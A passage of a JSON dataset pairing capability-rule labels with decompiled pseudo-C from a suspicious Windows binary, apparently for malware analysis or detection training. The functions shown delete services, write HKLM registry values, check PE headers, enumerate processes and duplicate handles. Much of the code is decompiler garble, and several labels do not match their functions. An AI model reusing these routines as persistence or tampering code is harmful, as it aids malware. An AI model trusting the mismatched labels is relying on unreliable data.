0x12;\n    pcStack24188 = str.R_y_;\n    pcStack24192 = 0x403417;\n    fcn.00402760();\n    uVar12 = extraout_DL_00 + 0x15;\n    uVar13 = uVar12 < extraout_AH;\n    bVar18 = SBORROW1(uVar12, extraout_AH);\n    cVar16 = uVar12 == extraout_AH;\n    uStack24176 = 4;\n    uStack24180 = 0x4106e4;\n    uStack24184 = 0x12;\n    pcStack24188 = str.R_y_;\n    pcStack24192 = 0x403437;\n    fcn.00402760();\n    if ((!bVar18) && (bVar18)) {\n        uVar13 = 0;\n        cVar16 = (extraout_ECX_02 & *(extraout_ECX_02 + 0x87cb1757)) == 0;\n    }\n    while( true ) {\n        pcStack24196 = 0x4106e8;\n        pcStack24200 = 0x12;\n        pcStack24192 = str.R_y_;\n        uStack24208 = 0x403461;\n        fcn.00402760();\n        if ((uVar13) || (!uVar13)) break;\n        if (extraout_ECX_03 == 1 || cVar16 == '\\0') {\n            *(puVar8 + 1) = puVar11 + 5;\n            uStack24208 = uStack24208 & 0xffff0000 | in_ES;\ncode_r0x0040347c:\n            pcStack24212 = str.Seg;\n            pcStack24216 = 0x12;\n            pcStack24220 = str.R_y_;\n            uStack24224 = 0x40348d;\n            fcn.00402760();\n            uStack24176 = 0xc;\n            uStack24180 = 0x4106f8;\n            uStack24184 = 0x12;\n            pcStack24188 = str.R_y_;\n            pcStack24192 = 0x4034ab;\n            fcn.00402760();\n            uStack24176 = 0xc;\n            uStack24180 = 0x410704;\n            uStack24184 = 0x12;\n            pcStack24188 = str.R_y_;\n            pcStack24192 = 0x4034cc;\n            fcn.00402760();\n            pcStack24192 = 0x2a;\n            pcStack24196 = str.5aD;\n            pcStack24200 = 0x12;\n            pcStack24204 = str.R_y_;\n            uStack24208 = 0x4034eb;\n            fcn.00402760();\n            uStack24176 = 0xb;\n            uStack24180 = 0x410768;\n            uStack24184 = 0x12;\n            pcStack24188 = str.R_y_;\n            pcStack24192 = 0x403522;\n            fcn.00402760();\n            pcStack24192 = 0x41;\n            pcStack24196 = 0x4107c4;\n            pcStack24200 = 0x12;\n            pcStack24204 = str.R_y_;\n            uStack24208 = 0x403535;\n            fcn.00402760();\n            uStack24208 = 0x33;\n            pcStack24212 = 0x410808;\n            pcStack24216 = 0x12;\n            pcStack24220 = str.R_y_;\n            uStack24224 = 0x403548;\n            fcn.00402760();\n            uStack24224 = 0x4b;\n            uStack24228 = 0x41083c;\n            pcStack24232 = 0x12;\n            fcn.00402760(str.R_y_);\n            uStack24176 = 0x39;\n            uStack24180 = 0x410888;\n            uStack24184 = 0x12;\n            pcStack24188 = str.R_y_;\n            pcStack24192 = 0x403571;\n            fcn.00402760();\n            pcStack24192 = 0x8;\n            pcStack24196 = 0x4108c4;\n            pcStack24200 = 0x12;\n            pcStack24204 = str.R_y_;\n            uStack24208 = 0x403584;\n            fcn.00402760();\n            uStack24208 = 0x14;\n            pcStack24212 = 0x4108cc;\n            pcStack24216 = 0x12;\n            pcStack24220 = str.R_y_;\n            uStack24224 = 0x403597;\n            uVar19 = fcn.00402760();\n            return uVar19;\n        }\n    }\n    uStack24208 = 6;\n    goto code_r0x0040347c;\n}\n",
        "token_count": 7551
    },
    "004035a0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038f9) overlaps instruction at (ram,0x004038f8)\n// \n\nvoid fcn.004035a0(void)\n\n{\n    int32_t *piVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t iVar7;\n    uint8_t *extraout_ECX_02;\n    uint32_t *extraout_ECX_03;\n    uint32_t *extraout_ECX_04;\n    int32_t extraout_EDX;\n    int32_t unaff_EBX;\n    ushort unaff_BP;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    uint32_t unaff_EDI;\n    uint *puVar9;\n    uchar *puVar10;\n    bool bVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    ulong uVar13;\n    unkbyte6 Var14;\n    ushort uStack00000006;\n    uint uVar15;\n    uint uVar16;\n    ushort uVar17;\n    uint8_t *puVar18;\n    uint32_t *puVar19;\n    \n    fcn.00402760(str.R_y_, 0x12, 0x4b0, 0x11);\n    iVar5 = fcn.00402760(str.R_y_, 0x12, 0x710, 0xf);\n    *(iVar5 + 0x12) = *(iVar5 + 0x12) + (extraout_ECX + 1 >> 8);\n    fcn.00402760(str.R_y_);\n    fcn.00402760(0x9c0, 0x12, 0x774, 10);\n    fcn.00402760(0x9c0, 0x12, 0x780, 0xb);\n    uVar16 = 0x41078c;\n    uVar15 = 0x12;\n    fcn.00402760(str.R_y_, 0x12, 0x41078c, 8);\n    bVar11 = false;\n    bVar12 = (((unaff_EBX ^ unaff_ESI) >> 8) - 1U & 0xd) == 0;\n    uVar17 = 0x794;\n    uVar13 = fcn.00402760(0x9c0, 0x12, 0x794, 9);\n    iVar5 = uVar13 >> 0x20;\n    pcVar6 = uVar13;\n    if ((!bVar12) && (bVar12)) {\n        uVar3 = uVar13;\n        if (bVar11 || unaff_EBX + 1 == 0) {\n            out(0x19, pcVar6);\n            *pcVar6 = *pcVar6 + uVar3;\n            iVar7 = extraout_ECX_00;\n            goto code_r0x004036ca;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (pcVar6 & 0xffff0000 | CONCAT11((uVar13 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        unaff_ESI = unaff_ESI + 1;\n    }\n    uVar16 = 0x4107a0;\n    uVar15 = 0x12;\n    fcn.00402760(str.R_y_, 0x12, 0x4107a0, 9);\n    iVar7 = extraout_ECX_01;\n    iVar5 = extraout_EDX;\ncode_r0x004036ca:\n    puVar9 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n    puVar8 = unaff_ESI + 1;\n    *(iVar5 + 0x12) = *(iVar5 + 0x12) + (iVar7 + 1 >> 8);\n    fcn.00402760(str.R_y_, uVar15, uVar16);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    bVar11 = false;\n    uStack00000006 = 0;\n    cVar4 = fcn.00402760(str.R_y_, 0x12);\n    if ((bVar11) || (!bVar11)) {\n        puVar18 = 0xa;\n        uVar17 = 0x8e4;\n    }\n    else {\n        *puVar9 = *puVar8;\n        *extraout_ECX_02 = *extraout_ECX_02 | cVar4 + 1U;\n        puVar8 = unaff_ESI + 5;\n        puVar9 = puVar9 + 1;\n        puVar18 = extraout_ECX_02;\n    }\n    fcn.00402760(0x9c0, 0x12, uVar17, puVar18);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    bVar11 = false;\n    uStack00000006 = 0;\n    Var14 = fcn.00402760(str.R_y_, 0x12);\n    if ((!bVar11) && (bVar11)) {\n        puVar10 = puVar9 ^ *(puVar9 + 0xe58be73);\n        puVar9 = puVar10 + 1;\n        uVar2 = in(Var14 >> 0x20);\n        *puVar10 = uVar2;\n        *extraout_ECX_03 = *extraout_ECX_03 | Var14;\n    }\n    fcn.00402760(0x9c0, 0x12);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    uStack00000006 = 0;\n    iVar5 = fcn.00402760(str.R_y_, 0x12);\n    bVar11 = SCARRY4(iVar5, 1);\n    uStack00000006 = 0;\n    iVar5 = fcn.00402760(str.R_y_, 0x12);\n    if ((bVar11) || (!bVar11)) {\n        puVar19 = 0x16;\n        unaff_BP = 0x99c;\n    }\n    else {\n        *puVar9 = *puVar8;\n        *extraout_ECX_04 = *extraout_ECX_04 | iVar5 + 1U;\n        puVar19 = extraout_ECX_04;\n    }\n    fcn.00402760(0x9c0, 0x12, unaff_BP, puVar19);\n    uStack00000006 = 0;\n    fcn.00402760(str.R_y_, 0x12);\n    return;\n}\n",
        "token_count": 1700
    },
    "00401380": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401380(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 125
    },
    "00401a80": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401bfe) overlaps instruction at (ram,0x00401bf9)\n// \n// WARNING: Removing unreachable block (ram,0x00401b75)\n// WARNING: Removing unreachable block (ram,0x00401aa9)\n// WARNING: Removing unreachable block (ram,0x00401bfe)\n// WARNING: Removing unreachable block (ram,0x00401abd)\n// WARNING: Removing unreachable block (ram,0x00401ac5)\n// WARNING: Removing unreachable block (ram,0x00401a49)\n// WARNING: Removing unreachable block (ram,0x00401ac8)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401a80(int16_t *param_1)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    uint *extraout_ECX;\n    uint *puVar3;\n    uint32_t uVar4;\n    int16_t *piVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint *unaff_EDI;\n    bool bVar9;\n    bool bVar10;\n    char in_SF;\n    char in_OF;\n    bool bVar11;\n    ulong uVar12;\n    uint *puStack8;\n    \n    puVar6 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        puVar6 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\n    if (*param_1 != 0x5a4d) {\n        return 0;\n    }\n    if (*(*(param_1 + 0x1e) + param_1) != 0x4550) {\n        return 0;\n    }\n    if ((*(param_1 + 0x1e) + param_1)[0x16] == 0) {\n        puStack8 = 0x40;\n        uVar4 = *(param_1 + 0x1e);\n        if (*(param_1 + 0x1e) < 0x81) {\n            return 0;\n        }\n        piVar5 = param_1;\n        if ((0x7f < uVar4) && (uVar4 < 0x80)) {\n            *(puVar6 | &stack0xfffffffc) = param_1;\n            piVar5 = param_1 & 0xffff0000 | param_1 + (param_1 >> 8) * 'y';\n        }\n        if (*(piVar5 + 0x1e) < 0xc0) {\n            puStack8 = *(piVar5 + 0x1e) - 0x80;\n        }\n        uVar12 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puStack8);\n        piVar5 = uVar12 >> 0x20;\n        puVar6 = uVar12;\n        if (puVar6 != NULL) {\n            puVar7 = NULL;\n            bVar9 = false;\n            bVar11 = false;\n            bVar10 = puStack8 == NULL;\n            puVar2 = puVar6;\n            puVar3 = extraout_ECX;\n            puVar8 = puVar7;\n            puVar1 = puStack8;\n            if (!bVar10) {\n                do {\n                    if ((bVar11 == puVar1 < 0) && (bVar11 != puVar1 < 0)) {\n                        puVar1 = puVar8 + 0x101427;\n                        puVar8 = puVar2;\n                    }\n                    else {\n                        puVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n                    }\n                    puVar3 = 0xff;\n                    puVar2 = puVar1 / 0xff;\n                    piVar5 = puVar1 % 0xff;\n                    puVar7 = puVar8 + 1;\n                    bVar9 = puVar7 < puStack8;\n                    bVar11 = SBORROW4(puVar7, puStack8);\n                    puVar1 = puVar7 - puStack8;\n                    bVar10 = puVar1 == NULL;\n                    *(puVar8 + puVar6) = piVar5;\n                    puVar8 = puVar7;\n                } while (bVar9);\n            }\n            puVar1 = puStack8;\n            puVar2 = puVar6;\n            if (!bVar9 && !bVar10) {\n                if (bVar9 || bVar10) {\n                    *puStack8 = *puVar7;\n                    puVar6 = puVar6 & 0xffff0000 | CONCAT11(0xdf, uVar12);\n                    puStack8 = NULL;\n                    puVar1 = puVar3;\n                    param_1 = piVar5;\n                    puVar2 = puVar7 + 1;\n                }\n            }\n            *(puVar6 + -0x743e7431) = *(puVar6 + -0x743e7431) | puVar1;\n            uVar4 = puVar1 >> 2;\n            puVar1 = param_1 + 0x40;\n            for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *puVar1 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar1 = puVar1 + 1;\n            }\n            uVar4 = puStack8 & 3;\n            bVar9 = uVar4 != 0;\n            for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *puVar1 = *puVar2;\n                puVar2 = puVar2 + 1;\n                puVar1 = puVar1 + 1;\n            }\n            if ((bVar9) && (!bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            func_0x00404610(puVar6);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1373
    },
    "004023c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004023c0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x41052c, arg_8h);\n    (*pcVar2)(&var_264h, 0x410544, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x41056c;\n    var_30h = 0x410578;\n    var_2ch = 0x410584;\n    var_28h = 0x410594;\n    var_24h = 0x41059c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1088
    },
    "004027f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004027f0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402610(0x80000002, 0x4106a4, str.Seg, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 131
    },
    "00404580": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045eb) overlaps instruction at (ram,0x004045ea)\n// \n// WARNING: Removing unreachable block (ram,0x004045c0)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404580(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    uint8_t uVar5;\n    uint32_t unaff_EBX;\n    int32_t *unaff_ESI;\n    uint *unaff_EDI;\n    char *pcVar6;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    unkuint6 Var10;\n    uint *puStack156;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint uStack124;\n    uint8_t *puStack120;\n    uchar auStack116 [4];\n    uint uStack112;\n    uint uStack108;\n    uchar auStack104 [4];\n    uchar auStack100 [48];\n    uint32_t uStack52;\n    ushort uStack48;\n    uint *puStack24;\n    \n    cVar9 = SBORROW4(&stack0xfffffffc, 0x94);\n    cVar8 = &var_94h < 0;\n    puStack156 = &var_94h;\n    var_94h = 0x94;\n    Var10 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if ((cVar9 == cVar8) && (cVar9 != cVar8)) {\n        puStack156 = puStack156 & 0xffff0000 | in_ES;\n        unaff_ESI = unaff_ESI + -1;\n        pcVar6 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar6 + 1;\n        *pcVar6 = Var10;\n        Var10 = Var10 & 0xff0000000000 | Var10 & 0xff00ffff0000 | Var10 + (Var10 >> 8) * 'y';\n        in_SS = puStack156._0_2_;\n    }\n    bVar7 = var_90h == 5;\n    if (bVar7) {\n        return 1;\n    }\n    if ((bVar7) || (!bVar7)) {\n        bVar7 = var_90h == 6;\n    }\n    else {\n        uVar4 = in(Var10 >> 0x20);\n        *unaff_EDI = uVar4;\n        if (&puStack156 < 1) {\n            *(Var10 + 0x40) = in_SS;\n            uVar5 = unaff_EBX;\n            *(extraout_ECX + -0x7d) = *(extraout_ECX + -0x7d) + uVar5;\n            *(unaff_EBX + 0x41fa2c0d) = *(unaff_EBX + 0x41fa2c0d) + 1;\n            uVar2 = unaff_EBX & 0xffff0000 | CONCAT11((unaff_EBX >> 8) * '\\x02', uVar5);\n            puVar3 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n            *puVar3 = *0x41fa24;\n            puVar3 = (*_sym.imp.MSVCRT.dll___p__commode)();\n            *puVar3 = *0x41fa20;\n            *0x41fa30 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n            fcn.004047a5();\n            if (*0x41f9e0 == uVar2) {\n                (*_sym.imp.MSVCRT.dll___setusermatherr)(0xa2);\n            }\n            fcn.00404790();\n            sub.MSVCRT.dll__initterm(0x406008, 0xc);\n            uStack112 = *0x41fa1c;\n            (*_sym.imp.MSVCRT.dll___getmainargs)(auStack100, auStack116, auStack104, *0x41fa18, &uStack112);\n            sub.MSVCRT.dll__initterm(0x406000, 0x406004);\n            puStack120 = *_sym.imp.MSVCRT.dll__acmdln;\n            if (*puStack120 != 0x22) {\n                do {\n                    if (*puStack120 < 0x21) goto code_r0x00404719;\n                    puStack120 = puStack120 + 1;\n                } while( true );\n            }\n            do {\n                puStack120 = puStack120 + 1;\n                if (*puStack120 == uVar5) break;\n            } while (*puStack120 != 0x22);\n            if (*puStack120 != 0x22) goto code_r0x00404719;\n            do {\n                puStack120 = puStack120 + 1;\ncode_r0x00404719:\n                puVar1 = puStack120;\n            } while ((*puStack120 != uVar5) && (*puStack120 < 0x21));\n            uStack52 = uVar2;\n            (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(0xa0);\n            if ((uStack52 & 1) == 0) {\n                uStack48 = 10;\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2, uVar2, puVar1, uStack48);\n            uStack108 = main(uVar4);\n            (*_sym.imp.MSVCRT.dll_exit)(uStack108);\n            uStack124 = **puStack24;\n            uVar4 = sub.MSVCRT.dll__XcptFilter(uStack124, puStack24);\n            return uVar4;\n        }\n        uVar2 = Var10 ^ 0xdee0ed6d;\n        *(unaff_EBX - 0x8f43) = *(unaff_EBX - 0x8f43) ^ uVar2 + (uVar2 >> 8) * -0x31;\n        *unaff_ESI = *unaff_ESI + 1;\n        bVar7 = *unaff_ESI == 0;\n    }\n    if ((bVar7) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1441
    },
    "00401410": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401410(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 87
    },
    "004015e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00401697)\n\nuint __cdecl fcn.004015e0(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x41f9e4)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x41f9e8)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x004016ad:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004016ad;\n        }\n        iVar3 = (**0x41f9ec)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 390
    },
    "00401e60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f03) overlaps instruction at (ram,0x00401f01)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00401e60(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    uint uStackY48;\n    uint uStackY44;\n    int32_t iStackY40;\n    uint uStackY36;\n    uint uStackY32;\n    uint uStackY28;\n    uint uStackY24;\n    uint uStackY20;\n    uint uStackY16;\n    \n    uStackY16 = 0x401e85;\n    iVar2 = fcn.004015e0(0x41051c);\n    if (iVar2 == -1) {\n        return 0;\n    }\n    uStackY16 = 0;\n    uStackY20 = 0x40;\n    uStackY24 = 0x401ead;\n    iStackY40 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iStackY40 == 0) {\n        return 0;\n    }\n    uStackY24 = 2;\n    uStackY28 = 0;\n    uStackY32 = 0;\n    uStackY36 = 0;\n    uStackY44 = arg_8h;\n    uStackY48 = 0x401ee0;\n    uStackY48 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *((&stack0xffffffd0 ^ *(unaff_EBX + 0x56)) - 4) = 0x401f0a;\n    (*pcVar1)();\n    return 1;\n}\n",
        "token_count": 436
    },
    "00401f20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f91) overlaps instruction at (ram,0x00401f8d)\n// \n// WARNING: Removing unreachable block (ram,0x00401f82)\n\nuint __cdecl fcn.00401f20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    uint *arg_8h_00;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    arg_8h_00 = &arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar1, arg_ch, arg_10h, arg_8h_00, 0);\n    if (iVar2 != 0) {\n        if (*0x41fa14 != 0) {\n            *unaff_EDI = iVar1 + 4;\n            iVar1 = -0x5e4713bc;\n            iVar2 = fcn.00401e60(arg_8h_00);\n            *0x41fa14 = iVar2 == 0;\n        }\n        fcn.00402090(0, iVar1);\n        if (*0x41fa14 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 361
    },
    "00402000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402020) overlaps instruction at (ram,0x0040201e)\n// \n\nint32_t fcn.00402000(void)\n\n{\n    int32_t iVar1;\n    char unaff_BH;\n    bool bVar2;\n    \n    iVar1 = fcn.00402350(0x4104b0);\n    bVar2 = iVar1 + 1 < 0;\n    if (iVar1 != -1) {\n        if ((bVar2) || (!bVar2)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            iVar1 = 1;\n        }\n        *(iVar1 + 0x7815ff52) = *(iVar1 + 0x7815ff52) + unaff_BH;\n        return iVar1 + 0x7815ff51;\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "00402840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl\nfcn.00402840(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403d20(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00403d20(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00403d20(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00403d20(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = fcn.004027f0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00402610(0x80000001, str.5aD, 0x410768, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4107b8),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return iVar1;\n}\n",
        "token_count": 579
    },
    "00402bb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
